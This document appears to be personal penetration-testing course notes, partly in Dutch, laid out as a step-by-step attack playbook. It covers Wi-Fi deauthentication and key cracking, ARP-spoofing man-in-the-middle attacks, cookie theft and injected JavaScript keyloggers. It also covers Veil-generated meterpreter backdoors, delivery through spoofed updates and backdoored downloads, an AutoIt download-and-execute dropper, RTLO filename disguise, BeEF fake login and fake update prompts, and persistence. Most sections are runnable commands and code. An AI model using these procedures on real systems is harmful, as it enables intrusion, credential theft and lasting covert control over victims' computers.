# Network Penetration Testing
### Change MAC-address
```
> ifconfig [interface] down
> macchanger -m [MAC] [interface]
> ifco`fig [interface] up
```

### Enable monitor mode

Monitordevice has different name than interface

`> airmon-ng start [interface]`

OR

Monitordevice has the same name than interface
```
> ifconfig [interface] down
> iwconfig [interface] mode monitor
> ifconfig [interface] up
```

# Pre Connection Attacks
### Start general packet sniffing

```
> airodump-ng [interface]

Example:

> airodump-ng mon0
```


### Start targeted packet sniffing

```
> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]

Example: 

> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
```
### Deauthentication attacks
#### To disconnect a device from the AP to let it reauthenticate 

To de-authenticate all clients in a specific network
```
> aireplay-ng --deauth [number of packets] -a [AP] [INTERFACE]

Example: 

> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0
```

To de-authenticate a specific client in a network
```
> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]

Example: 

> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0

```

# Gaining Access To Encrypted Networks 

## WEP Cracking 

using a random 24-bit Initializing Vector (IV), 
in a busy network we can collect more than two packets with the same IV.

### CASE 1: BASE CASE

Log the traffic from the target network
```
> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]

Example: 

> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
```

try to crack the key using the capturefile
```
> aircrack-ng [file-name]

Example: 

> aircrack-ng out.cap
```

### CASE 2: AP is idle or no clients associated with AP (packet injection)

we have to authenticate our wifi card with the AP, because AP's ignore 
any requests that come from devices that are not associated with the AP
```
> aireplay-ng --fakeauth 0 -a [targe MAC] -h [your MAC] [interface]`

Example: 

> aireplay-ng --fakeauth 0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
```

	If this fake authentication was successful the value under the
	“AUTH” column in airodump-ng will change to “OPN”

we will wait for an ARP packet , we will then capture this packet and 
inject it into the traffic , this will force the AP to generate a new 
ARP packet with a new IV , we capture this new packet and inject into 
the traffic again , this process is repeated until the number of IV's 
captured is sufficient enough to crack the key.
```
> aireplay-ng --arpreplay -b [targe MAC] -h [your MAC] [interface]

Example: 

> aireplay-ng --arpreplay -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
```

Then we try to crack the key

`> aircrack-ng out.cap`

## WPA Cracking

### CASE 1: BASE CASE WITH WPS ENABLED 

Encrypted with a unique temporary key, number of data collected is irrelevant.

Scan for AP's where WPS is enabled (vulnerable)
```
> wash -i [interface]

Example:

> wash -i mon0
```

Brute force the WPS ping and calculate the WPA key
```
> reaver -i [interface] -b [TARGET AP MAC] -c [TARGET CHANNEL] -vv

Example: 

> reaver -b E0:69:95:8E:18:22 -c 11 -i mon0
```

### CASE 2: WPS DISABLED, CAPTURING HANDSHAKE

Handshake packets are sent every time a client associates with the target AP.
Start airodump to see if there are clients connected to the AP
```
> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]

Example: 

> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
```
Wait for a client to connect to the AP, or deauthenticate a connected
client (if any) for a very short period of time so that their system will
connect back automatically.
```
> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]

Example: 

> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0
```
(Notice top right corner of airodump-ng will say “WPA handshake”.)

## Creating a wordlist
we need a list of all the possible passwords, you can create them yourself
```
> crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file

Example: 

> crunch 6 8 123456!"£$% -o wordlist -t a@@@@b
```

Use aircrack to crack the key

```
> aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]

Example:

> aircrack-ng is-01.cap -w list mon0
```

# POST CONNECTION ATTACKS (TOT HIER OPMAAK)

### NETDISCOVER
Discover the connected clients of the current network
```
> netdiscover -i [INTERFACE] -r [RANGE]

Example: 

> netdiscover -i wlan0 -r 192.168.1.1/24
```

### AUTOSCAN

Program installed in Kali Linux.

### NMAP

`>zenmap`

ping scan (basic)
quick scan (shows open port numbers)
quick scan plus (shows running programs on open ports)
```
	If there is an Apple iPhone or iPad with port SSH open, you can login with 
	>ssh root@[ip address of device]
	passord: alpine
```

## MAN IN THE MIDDLE ATTACKS

All arp requests/responses are trusted between client and router.

### ARP POISONING
Send ARP response to the client (without he asks it) and say the hackers ip is the ip of the router.
So you tell the client you are the router by telling the client that the device with the routers ip has your MAC address,
so the client starts sending packets through you. Send ARP response to the router telling you are the client 
by telling the clients ip address has your MAC address. You are in the middle of the packets.

#### ARP SPOOF 
tell client you are the router
```
> arpspoof -i [interface] -t [Target IP] [AP ip]

Example:

> arspoof -i wlan0 -t 192.168.1.5 192.168.1.1
```

tell the router you are the client
```
> arpspoof -i [interface] -t [AP ip] [Target IP]

Example:

> arspoof -i wlan0 -t 192.168.1.1 192.168.1.5
```

Enable IP forward to allow packets to flow through our device without being dropped.
`> Echo 1 > /proc/sys/net/ipv4/ip_forward`

#### MITMF Man In The Middle Framework
```
> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0

Example:

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0
```
Enable IP forward to allow packets to flow through our device without being dropped.

`> Echo 1 > /proc/sys/net/ipv4/ip_forward`

WHEN CLIENT USES COOKIES TO LOGIN

sniff the cookies instead of sniffing passwords (`apt-get install ferret-sidejack`)
BEING MAN IN THE MIDDEL IS NEEDED!!!!!
```
> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0

Example:

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0
```
Capture the cookies
```
> ferret -i [interface]

Example:

ferret -i eth0
```
(is a UI, injects the captured cookies into own browser)

`> hamster`

(to use this tool: go to settings of browser, advanced, network, connection settings
and change the port numer to 127.0.0.1 Port 1234 and navigate in browser to 127.0.0.1/1234)

### DNS SPOOFING

start the webserver

`> service apache2 start`

Adjust the file with the right ip settings [[[A]]]

`> leafpad /etc/mitmf/mitmf.conf`

Start spoofing

`> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --dns`

#### MITMF Screenshotter 

`> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --screen`

(screenshots located in /var/log/mitmf directory)

#### MITMF KEYLOGGER 

`> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --jskeylogger`

#### MITMF Code Injection 

`> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 --inject --js-payload "alert('test!');" `

OR 

`> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 --inject --js-file /root/alert.js`

(you need to make a .js file in the home directory)


# NEXPOSE SCANNING TOT HIER OPMAAK

## Generate Backdoor

--------- Veil Framework ----------
https://github.com/Veil-Framework/Veil
Hier downloaden
In de map /opt
'git clone https://github.com/Veil-Framework/Veil'
Navigeer naar /opt/Veil/setup
./setup.py

Run: ./opt/Veil/Veil.py
```
> list
> 1
> list
> go/meterpreter/rev_https
> options instellen
> generate
```
stored here: /usr/share/veil-output/compiled/rev_https_80801.exe

---- Backdoor installeren ----
Luisteren op inkomende connections voor de poort waar de backdoor voor gecreate is 
```
> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_https
> exploit
```
LHOST eigen ip
LPORT 8080

Dan op target computer backdoor uitvoeren zodat die computer connectie maakt met poort 8080 van ons

--- Backdoor delivery 1: Spoofing Software Updates ----
Install Evilgrade
```
> git clone https://github.com/infobyte/evilgrade.git
> cd evilgrade/
> cpan Data::Dump
> cpan Digest::MD5
> cpan Time::HiRes
> cpan RPC::XML

> ./evilgrade
> show modules
> configure 'program'
> show options
> agent naar backdoor zetten
> start
```

(andere terminal)
`> leafpad /etc/mitmf/mitmf.conf`
dns poort 5353 aanpassen en ip's
[[[A]]] reccords aanpassen:
link van update in evilgrade : eigen ip (dus doorverwijzen naar uzelf)
`> mitmf --arp --spoof --gateway ... ---target ... -i eth0 --dns`

(andere temrinal)
```
> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_http
LHOST eigen ip
> exploit
```
LPORT 8080

wanneer target update, krijg je terminalcommand rights

--- Backdoor delivery 2: Backdooring exe downloads ----
Wanneer target iets random dowload, wordt de exe gebackdoored

`> leafpad /etc/bdfproxy/bdfproxy.cfg`
proxyMode = transparent
Host aanpassen naar eigen ip
`> bdfproxy`

(andere terminal)
```
> iptables -t nat -A PREROUTING -p -tcp --destination-port 80 -j REDIRECT --to-port 8080
> mitmf --arp --spoof --gateway ... --target ... -i eth0 --dns
```

(andere terminal)
`> msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc` (link staat waar bdfproxy draait)

Target download programma

# Social Engeneering

https://drive.google.com/uc?export=download&confirm=oLcO&id=16C95FI7yq4Uh82KgQ2Cg8H5-3jz4Umaz
Download Maltego met alle opties gratis

Run met /opt/maltegoce/bin/maltego

maak username en pw

## Backdooring Any File Type

Using an already created backdoor (see above) 
```
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "url1,url2"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
```
* Local URL's: the file you want the target to see, needs to be online (on a server)
 First eg: "imageurl.jpg, backdoor.exe"
 
### Compiling the created script
(If Veil is installed, autoit will be installed automaticly)
* Change extention of the script from `.txt` to `.au3`.
* Search for compile; click the compile autoit program
* Source: created .au3 script
  Destination: .exe file
* use www.iconarchive.com to download and use a custom icon. (in case of an pdf, word,...)
  in case of an image: go to www.rw-designer.com/image-to-icon to an `.ico` file.
* Put the file you want the target to download on a webserver.
#### Wait for incomming connections
```
> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_https
LHOST eigen ip
LPORT 8080
> exploit
```

### Spoofing .exe file to any other file type
For example:
* You have a file: gtr.exe and you want to make it a .jpg
* We need to use a `right-to-left character`.
##### How to find `right-to-left character`
Search for characters, search for right to left override and copy the character.

* Name the file gtrgpj.exe and put a `right-to-left character` between r and g.
=> gtrexe.jpg
* Zip the file otherwise, your internetbrowser will remove the `right-to-left character`.

## Send mails as any person you want

Using Maltego, you can find people close to your target.

* search for https://anonymousemail.me

## Beef Framework

Browser exploitation framework.

Click the Beef icon in Kali.
Username `beef`
Password `beef`

How to hook browsers: when the target runs a command
(via dns spoof, or social engineering)

```
go to /var/www/html
modify index.html
copy and paste the code from beef (next to Example:)
chance the ip address to the ip address of the target.
Every target that connects to that browser, will be hooked to beef.
start the webserver: `service apache2 start`
Use DNS Spoofing or social engineering to let your target browe your website.
```

### Beef - Hooking targets using MITMF
copy the code from beef (next to Example:)
`root@kali:~# mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --inject --js-url http://10.20.14.207:3000/hook.js`

http://10.20.14.207:3000/hook.js is the url where the hook is stored.

When they browse any website, they are hooked.
(You can see it in the source code of the website that the code is injected.)

### Running basic commands on the target computer
In the 'commands' tab, 
```
Search for `raw javascript`
Here you can implement any javascriptcode you want, E.g. Keylogger!
```
```
Search for 'Spider Eye'
This command takes a screenshot of the targets computer.
```
```
Search for 'Redirect Browser'
This command redirects the target to any page you want,
you also can let the target download an update.
```

### Beef - Steal usernames and passwords using a fake login prompt
### --- !!! ---
```
Search for 'Pretty theft'
Choose the account you want to hijack. (Facebook, youtube,...)
```

### Beef - Gaining full control over the target pc
### --- !!! ---
```
Search for 'Fake notification bar'
Choose the correct webbrowser
This will give the target a notification that there is an update needed to install
use an own created backdoor (reverse http to get meterpreter access)
upload to your own webserver
Plugin URL is `http://10.20.14.207/update.exe`
ip address is own webservers ip address and update.exe is the exploit (backdoor)
Notification: 'Critical update for Firefox, click here to install'
Before running this command, you need to be listening on the port your backdoor tries to connect with.
> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_http
LHOST eigen ip
LPORT 8080
> exploit
```

# Gaining Access - Using the above attacks outside the local network

Network router has a private and a public ip-address.
If you want to hack a target you need to edit your router settings;
In your backdoors, your ip address you are listening on, has to be your routers public ip address.
`Google: what's my ip`

### example 1
You send a backdoor to a target computer, and you are listening to port 8080
Your router gets the reverse connection from the target computer but does not know what to do with it.
You need to configure the port forwarding in the router in a way that port 8080 reverse connections are forwarded to the hackers private ip.
If you use a webserver where your backdoor is stored, and whereto you link the target to download your backdoor, you need to open that port as well. (Port 80)


Make a backdoor
```
> veil
> list
> use 9 (meterpreter/reverse_http)
>> LHOST 89.100.145.189 (the public ip from router)
>> generate
```
name: backdoor.exe
*Stored at: /var/lib/veil-evasion/output/compiled/backdoor.exe
Copy to webserver in /var/www/html

Listen for incomming http connections on local ip (because the router will forward the reverse connection on port 8080)
```
> msfconsole
>> use exploit/multi/handler
>>> set PAYLOAD windowss/meterpreter/reverse_http
>>> set LPORT 8080
>>>set LHOST 192.168.0.11 (private ip of own computer)
>>> exploit
```

### Example 2 (Beef)

Start Beef and login with beef, beef
copy the scriptcode next to Example and paste it into the index.xtml in /var/www/html
change the public ip from router: (code looks like this)
`<script src="http://89.100.145.189:3000/hook.js"></script>`

Enable port 3000 in router settings forwarding to private address of computer.
If the target goes to your webserver, it get's hooked.

### Forward all the ports from router to the hackers machine

Go to the router settings; 
Change DMZ address to hackers ip address.

# Post Exploitation

### Meterpreter basics

After getting a meterpreter session you can run the session in the background so that you can run other exploits
`meterpreter> background`

Show a list with all the current sessions
`meterpreter> sessions -l` 

Interact with a meterpreter session running in the background
`kali@root> sessions -i 2`  

Show the system information
`meterpreter> sysinfo`

Show the network interfaces of the target computer
`meterpreter> ipconfig`

Show all the processes running on the computer
`meterpreter> ps`

Migrate to another proces running on the target computer,
safest thing to do is migrate to explorer.exe because this is the GUI of the target computer. 
If you don't do this, and the target closes your backdoor or program running, you will be disconnected.
`meterpreter> migrate 2116` (2116 is the process id for example of explorer.exe)

Get current working directory
`meterpreter> pwd`

List all files and directories
`meterpreter> ls`

Read a file
`meterpreter> cat text.txt`

Download a file
`meterpreter> download text.txt`

Upload a file (mostly a backdoor,virus,...)
`meterpreter> upload file.exe`

Execute a file
`meterpreter> execute -f file.exe`

Use a windows command prompt
`meterpreter> shell`

### Maintaining Access 

#### Method 1: using a veil-evasion (does not always work)

Use a rev_http_service instead of the normal backdoor used to connect to the target
Set a veil http service als upload it to the target computer
```
> veil-evasion
> list
> use 5
Set up the rest
```

#### Method 2: using persistence module in meterpreter (Detectable by antivirus programs)
`meterpreter> run persistence -h` (to show the options)
`meterpreter> run persistence -U -i 20 -p 80 -r 10.20.14.203`
-U to run it under user privileges, when the user logs on
-i is trying to connect back to the hacker every 20 seconds in this case
-p port 80 is used to connect
-r is the ip address where the service tries to connect with

#### Method 3: Reliable and undetectable (metasploit + veil)

Background the existing meterpreter session
`meterpreter> background`

Use a persistence exploit in metasploit
```
msf exploit(handler)> use exploit/windows/local/persistence
msf exploit(persistence)> show options
```
DELAY: amount of time to keep reconnecting back
EXE_NAME: filename used on the target host in the processes
`> set EXE_NAME browser.exe`
SESSION: which session to run the exploit aan
controlleer eerst de running sessions: `> sessions -l`
`> set SESSION 1`
##### Show advanced options for this module
`> show advanced`

`set EXE::Custom /var/www/html/backdoor.exe`

Upload the exploit to session 1
`exploit`

When you kill the running meterpreter sessions (`sessions -K`)
and the target pc reboots, so no more connections remaining, and you 
use exploit/multi/handler to listen to the port specified in the backdoor you uploaded.
##### YOU ALWAYS WILL GET A CONNECTION!!!!

























	
